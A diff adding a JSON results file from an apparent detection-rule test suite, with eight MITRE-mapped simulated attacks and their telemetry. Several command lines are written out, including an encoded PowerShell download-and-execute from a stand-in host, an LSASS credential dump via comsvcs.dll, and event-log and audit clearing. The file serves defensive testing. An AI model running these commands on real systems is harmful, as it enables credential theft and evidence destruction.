@@ -1,0 +1,164 @@
+{
+  "generatedAt": "2026-11-01T11:11:28.503Z",
+  "adversarySimulationSuite": "BlueOps Advanced Deceptive Attack Suite v1.0",
+  "totalAttacks": 8,
+  "detectedAttacks": 8,
+  "detectionRate": 100,
+  "responseAgentBoundaryTests": {
+    "total": 5,
+    "passed": 5
+  },
+  "attackDetails": [
+    {
+      "testId": "ATK-001",
+      "name": "Deceptive Encoded PowerShell Execution (Mixed Case & Arguments)",
+      "mitreTactic": "Execution",
+      "mitreId": "T1059.001",
+      "expectedRule": "D008",
+      "severity": "HIGH",
+      "evasionTechnique": "Mixed-case parameter obfuscation (-eNCoDeDCoMmAnD)",
+      "status": "DETECTED",
+      "simulatedTelemetry": {
+        "provider": "Sysmon",
+        "EventID": 1,
+        "hostname": "WIN-WORKSTATION-01",
+        "host_ip": "192.168.56.101",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "CommandLine": "powershell.exe -NoLogo -NonI -w hidden -eNCoDeDCoMmAnD SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGwAYQBiAC8AcAAuAHAAcwAxACcAKQA=",
+        "username": "analyst.dev"
+      }
+    },
+    {
+      "testId": "ATK-002",
+      "name": "Office Macro Document Spawning Command Interpreter",
+      "mitreTactic": "Execution",
+      "mitreId": "T1059",
+      "expectedRule": "D009",
+      "severity": "HIGH",
+      "evasionTechnique": "Parent-process spoofing / Macro execution chain",
+      "status": "DETECTED",
+      "simulatedTelemetry": {
+        "provider": "Sysmon",
+        "EventID": 1,
+        "hostname": "WIN-WORKSTATION-01",
+        "host_ip": "192.168.56.101",
+        "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "Image": "C:\\Windows\\System32\\cmd.exe",
+        "CommandLine": "cmd.exe /c powershell -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==",
+        "username": "analyst.dev"
+      }
+    },
+    {
+      "testId": "ATK-003",
+      "name": "Credential Dumping via In-Memory LSASS MiniDump",
+      "mitreTactic": "Credential Access",
+      "mitreId": "T1003.001",
+      "expectedRule": "D011",
+      "severity": "CRITICAL",
+      "evasionTechnique": "Native LOLBAS DLL abuse (comsvcs.dll) without touching disk with mimikatz binary",
+      "status": "DETECTED",
+      "simulatedTelemetry": {
+        "provider": "Sysmon",
+        "EventID": 1,
+        "hostname": "WIN-WORKSTATION-01",
+        "host_ip": "192.168.56.101",
+        "Image": "C:\\Windows\\System32\\rundll32.exe",
+        "CommandLine": "rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 624 C:\\temp\\lsass.dmp full",
+        "username": "SYSTEM"
+      }
+    },
+    {
+      "testId": "ATK-004",
+      "name": "Adversary Defense Evasion: Windows Event Log Clearing",
+      "mitreTactic": "Defense Evasion",
+      "mitreId": "T1070.001",
+      "expectedRule": "D012",
+      "severity": "HIGH",
+      "evasionTechnique": "Tampering with forensic event traces",
+      "status": "DETECTED",
+      "simulatedTelemetry": {
+        "provider": "Sysmon",
+        "EventID": 1,
+        "hostname": "WIN-WORKSTATION-01",
+        "host_ip": "192.168.56.101",
+        "Image": "C:\\Windows\\System32\\wevtutil.exe",
+        "CommandLine": "wevtutil cl Security",
+        "username": "SYSTEM"
+      }
+    },
+    {
+      "testId": "ATK-005",
+      "name": "Adversary Defense Evasion: Linux Audit Subsystem Tampering",
+      "mitreTactic": "Defense Evasion",
+      "mitreId": "T1562.002",
+      "expectedRule": "D006",
+      "severity": "HIGH",
+      "evasionTechnique": "Disabling kernel audit logging",
+      "status": "DETECTED",
+      "simulatedTelemetry": {
+        "provider": "Linux-auditd",
+        "hostname": "LNX-PROD-SRV-01",
+        "host_ip": "192.168.56.102",
+        "CommandLine": "auditctl -D",
+        "username": "root",
+        "action": "audit_tamper"
+      }
+    },
+    {
+      "testId": "ATK-006",
+      "name": "Linux Interactive Root Shell Escalation from Sudo",
+      "mitreTactic": "Privilege Escalation",
+      "mitreId": "T1548.003",
+      "expectedRule": "D004",
+      "severity": "HIGH",
+      "evasionTechnique": "Session hijacking to persistent root shell",
+      "status": "DETECTED",
+      "simulatedTelemetry": {
+        "provider": "Linux-auditd",
+        "hostname": "LNX-PROD-SRV-01",
+        "host_ip": "192.168.56.102",
+        "CommandLine": "sudo /bin/bash",
+        "username": "deploy",
+        "action": "privileged_execution"
+      }
+    },
+    {
+      "testId": "ATK-007",
+      "name": "Outbound C2 Egress to Known Threat Intel IP Indicator",
+      "mitreTactic": "Command and Control",
+      "mitreId": "T1071",
+      "expectedRule": "D015",
+      "severity": "HIGH",
+      "evasionTechnique": "C2 channel matching known adversary threat infrastructure",
+      "status": "DETECTED",
+      "simulatedTelemetry": {
+        "provider": "Suricata",
+        "hostname": "WIN-WORKSTATION-01",
+        "host_ip": "192.168.56.101",
+        "dest_ip": "198.51.100.24",
+        "dest_port": 4444,
+        "domain": "c2-beacon.adversary-lab.internal",
+        "action": "c2_beacon_egress"
+      }
+    },
+    {
+      "testId": "ATK-008",
+      "name": "Defense Evasion: svchost.exe Masquerading outside System32",
+      "mitreTactic": "Defense Evasion",
+      "mitreId": "T1036",
+      "expectedRule": "D018",
+      "severity": "HIGH",
+      "evasionTechnique": "Process masquerading as trusted Windows Service Host",
+      "status": "DETECTED",
+      "simulatedTelemetry": {
+        "provider": "Sysmon",
+        "EventID": 1,
+        "hostname": "WIN-WORKSTATION-01",
+        "host_ip": "192.168.56.101",
+        "Image": "C:\\Users\\analyst\\AppData\\Local\\Temp\\svchost.exe",
+        "CommandLine": "C:\\Users\\analyst\\AppData\\Local\\Temp\\svchost.exe -k netsvcs",
+        "username": "analyst.dev"
+      }
+    }
+  ]
+}
